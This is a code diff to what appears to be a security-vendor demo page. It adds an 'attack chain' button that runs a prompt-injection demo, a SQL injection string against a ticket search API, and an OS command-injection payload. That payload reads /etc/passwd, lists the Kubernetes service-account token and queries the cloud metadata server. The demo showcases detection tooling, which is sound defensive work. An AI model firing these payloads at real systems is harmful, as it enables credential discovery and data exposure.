@@ -745,6 +745,59 @@
       font-size: 11.5px;
       outline: none;
     }
+    .chain-btn {
+      width: 100%;
+      appearance: none;
+      font-family: inherit;
+      font-size: 12.5px;
+      font-weight: 800;
+      letter-spacing: 0.01em;
+      padding: 10px 13px;
+      border-radius: 11px;
+      border: 1px solid rgba(248, 113, 113, 0.55);
+      background: linear-gradient(135deg, #dc2626 0%, #991b1b 55%, #4f46e5 100%);
+      color: #ffffff;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+      box-shadow: 0 8px 20px rgba(220, 38, 38, 0.3);
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
+    }
+    .chain-btn:hover { transform: translateY(-1px); box-shadow: 0 10px 24px rgba(220, 38, 38, 0.42); }
+    .chain-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+    .chain-steps {
+      display: none;
+      flex-direction: column;
+      gap: 5px;
+      background: rgba(6, 11, 29, 0.55);
+      border: 1px solid rgba(148, 163, 184, 0.16);
+      border-radius: 10px;
+      padding: 8px 10px;
+      font-size: 11.5px;
+    }
+    .chain-steps.visible { display: flex; }
+    .chain-step {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+      color: var(--text-muted);
+    }
+    .chain-pill {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 10px;
+      font-weight: 700;
+      padding: 2px 7px;
+      border-radius: 999px;
+      background: rgba(148, 163, 184, 0.18);
+      color: #cbd5e1;
+      text-transform: uppercase;
+    }
+    .chain-pill.run { background: rgba(59, 130, 246, 0.25); color: #93c5fd; }
+    .chain-pill.blocked { background: rgba(16, 185, 129, 0.22); color: #6ee7b7; }
+    .chain-pill.alert { background: rgba(239, 68, 68, 0.25); color: #fca5a5; }
 
     /* VIEW 2: Model Armor Logs */
     .logs-shell { display: flex; flex-direction: column; gap: 18px; flex: 1; }
@@ -1029,9 +1082,27 @@
               <span>Actor:</span>
               <input type="text" id="userId" value="castor.troy@cymbalbank.example" title="Actor email correlated in Google SecOps" />
             </div>
+            <button class="chain-btn" id="chainBtn" onclick="runAttackChain()" title="Execute full Demo 1 AI -> AppSec -> GKE Runtime chain (Alt+A)">
+              <span>⚡ Run Multi-Vector Attack Chain</span>
+              <span class="chip-tag" style="background:rgba(255,255,255,0.2);color:#fff;">Demo 1</span>
+            </button>
+            <div class="chain-steps" id="chainSteps">
+              <div class="chain-step">
+                <span>1. Indirect Prompt Injection (Model Armor)</span>
+                <span class="chain-pill" id="cs1">Idle</span>
+              </div>
+              <div class="chain-step">
+                <span>2. AppSec Pivot (CWE-89 Ticket Dump)</span>
+                <span class="chain-pill" id="cs2">Idle</span>
+              </div>
+              <div class="chain-step">
+                <span>3. GKE Container Recon (CWE-78 → Wiz Defend)</span>
+                <span class="chain-pill" id="cs3">Idle</span>
+              </div>
+            </div>
             <div class="pivot-row">
               <button class="pivot-btn" onclick="switchView('logs')">Inspect SecOps Logs →</button>
-              <button class="pivot-btn" onclick="switchView('lab')">Wiz Runtime &amp; Code Lab →</button>
+              <button class="pivot-btn" onclick="switchView('lab')">Security Lab →</button>
             </div>
           </div>
         </div>
@@ -1120,7 +1191,7 @@
             </div>
             <div style="display:flex;gap:8px;flex-wrap:wrap;">
               <button class="lab-btn ghost" onclick="document.getElementById('pingInput').value='8.8.8.8';runPing()">Safe: 8.8.8.8</button>
-              <button class="lab-btn danger" onclick="document.getElementById('pingInput').value='8.8.8.8; id; uname -a; cat /etc/passwd | head -n 3';runPing()">Simulate Runtime Recon (CWE-78)</button>
+              <button class="lab-btn danger" onclick="document.getElementById('pingInput').value=RUNTIME_RECON_PAYLOAD;runPing()">Simulate Runtime Recon (CWE-78)</button>
             </div>
             <pre class="lab-pre" id="pingOut">Waiting for command execution...</pre>
           </div>
@@ -1506,6 +1577,93 @@
       out.textContent = JSON.stringify(await res.json(), null, 2);
     }
 
+    const RUNTIME_RECON_PAYLOAD =
+      "8.8.8.8; id; uname -a; ls -la /var/run/secrets/kubernetes.io/serviceaccount/token; curl -s -m 2 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email; echo ''; cat /etc/passwd | head -n 3";
+
+    function setChainBadge(id, text, cls) {
+      const el = document.getElementById(id);
+      if (!el) return;
+      el.textContent = text;
+      el.className = "chain-pill" + (cls ? " " + cls : "");
+    }
+
+    function addPivotBubble(title, detail, badgeText) {
+      const box = document.getElementById("chatBox");
+      const grp = document.createElement("div");
+      grp.className = "msg-group bot blocked";
+      grp.innerHTML = `
+        <div class="bubble">
+          <h4>${escapeHtml(title)}</h4>
+          <p>${escapeHtml(detail)}</p>
+        </div>
+        <div class="msg-meta">
+          <span class="meta-badge block">${escapeHtml(badgeText)}</span>
+          <span class="meta-link" onclick="switchView('lab')">View raw output in Security Lab →</span>
+        </div>
+      `;
+      box.appendChild(grp);
+      box.scrollTop = box.scrollHeight;
+    }
+
+    async function runAttackChain() {
+      const btn = document.getElementById("chainBtn");
+      const stepsEl = document.getElementById("chainSteps");
+      btn.disabled = true;
+      stepsEl.classList.add("visible");
+      setChainBadge("cs1", "Running...", "run");
+      setChainBadge("cs2", "Queued", "");
+      setChainBadge("cs3", "Queued", "");
+
+      try {
+        // Step 1: Indirect Prompt Injection blocked by Google Cloud Model Armor
+        if (!armorToggle.checked) {
+          armorToggle.checked = true;
+          updateArmorVisual();
+        }
+        await sendDocDemo("wire-proposal-2026.txt", "Summarise this counterparty wire proposal for the desk.");
+        setChainBadge("cs1", "Blocked · SecOps", "blocked");
+
+        // Step 2: Attacker pivots to AppSec CWE-89 SQLi ticket dump
+        setChainBadge("cs2", "Running...", "run");
+        const sqliRes = await fetch(`/api/tickets/search?q=${encodeURIComponent("' OR '1'='1")}`);
+        const sqliData = await sqliRes.json();
+        document.getElementById("vulnOut").textContent = JSON.stringify(sqliData, null, 2);
+        const ticketCount = Array.isArray(sqliData.results) ? sqliData.results.length : 0;
+        setChainBadge("cs2", `${ticketCount} Rows Exposed`, "alert");
+        addPivotBubble(
+          "Attacker Pivot 1 · CWE-89 SQL Injection",
+          `After Model Armor blocked the prompt injection, ${document.getElementById("userId").value.trim()} pivoted to /api/tickets/search and dumped ${ticketCount} internal support tickets.`,
+          "⚠ AppSec Exploit · Flagged by Wiz Code + CodeMender"
+        );
+
+        // Step 3: Attacker pivots to GKE Container Runtime Recon via CWE-78
+        setChainBadge("cs3", "Running...", "run");
+        document.getElementById("pingInput").value = RUNTIME_RECON_PAYLOAD;
+        const pingRes = await fetch("/api/diagnostics/ping", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            host: RUNTIME_RECON_PAYLOAD,
+            user_id: document.getElementById("userId").value.trim()
+          })
+        });
+        const pingData = await pingRes.json();
+        document.getElementById("pingOut").textContent = JSON.stringify(pingData, null, 2);
+        const outLine = String(pingData.output || "").split("\n").find((l) => l.includes("uid=")) || "Container shell executed";
+        setChainBadge("cs3", "Root Shell · eBPF", "alert");
+        addPivotBubble(
+          "Attacker Pivot 2 · CWE-78 Container Runtime Recon (GKE)",
+          `Executed OS command injection inside wiz-ai-chat (${outLine.trim()}) and queried GKE Workload Identity metadata — streaming telemetry to Wiz Defend & Google SecOps.`,
+          "🔥 Runtime Pivot · Wiz Defend + SecOps Correlation"
+        );
+      } catch (err) {
+        setChainBadge("cs3", "Error", "alert");
+        console.error(err);
+      } finally {
+        btn.disabled = false;
+      }
+    }
+
     document.getElementById("chatInput").addEventListener("keydown", (e) => {
       if (e.key === "Enter" && !e.shiftKey) {
         e.preventDefault();
@@ -1523,6 +1681,10 @@
         e.preventDefault();
         armorToggle.checked = !armorToggle.checked;
         updateArmorVisual();
+      } else if (e.key.toLowerCase() === "a") {
+        e.preventDefault();
+        switchView("assistant");
+        runAttackChain();
       }
     });
 
